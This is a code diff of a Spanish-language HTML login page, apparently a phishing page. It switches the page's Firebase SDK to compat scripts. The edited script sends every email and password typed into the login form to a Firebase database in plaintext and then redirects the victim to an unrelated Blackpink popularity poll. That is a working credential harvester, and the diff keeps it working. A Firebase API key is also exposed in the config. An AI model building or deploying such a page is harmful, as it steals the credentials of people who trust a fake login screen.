@@ -65,12 +65,11 @@
     </div>
   </div>
 
-  <!-- Firebase SDK -->
-  <script type="module">
-    // Importar SDK
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
-    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-database.js";
+  <!-- Firebase SDK (compat) -->
+  <script src="https://www.gstatic.com/firebasejs/11.0.1/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/11.0.1/firebase-database-compat.js"></script>
 
+  <script>
     // Configuración de Firebase
     const firebaseConfig = {
       apiKey: "AIzaSyBFcBx7J4Yi01yka8oqqwEnjWQ4gYt7WBo",
@@ -84,8 +83,8 @@
     };
 
     // Inicializar Firebase
-    const app = initializeApp(firebaseConfig);
-    const db = getDatabase(app);
+    const app = firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
 
     const loginForm = document.getElementById('loginForm');
     const recoverLink = document.getElementById('recoverLink');
@@ -96,18 +95,15 @@
       const password = this.password.value;
 
       // Guardar en Realtime Database
-      push(ref(db, 'usuarios'), {
+      db.ref('usuarios').push({
         email,
         password,
         fecha: new Date().toLocaleString()
       })
       .then(() => {
-        // Redirigir a la votación
         window.location.href = "https://www.tuvotacion.com/quien-es-la-ms-bonita-de-blackpink-1";
       })
-      .catch((error) => {
-        console.error("Error al guardar en Firebase:", error);
-      });
+      .catch(err => console.error("Error al guardar en Firebase:", err));
     });
 
     recoverLink.addEventListener('click', function(){
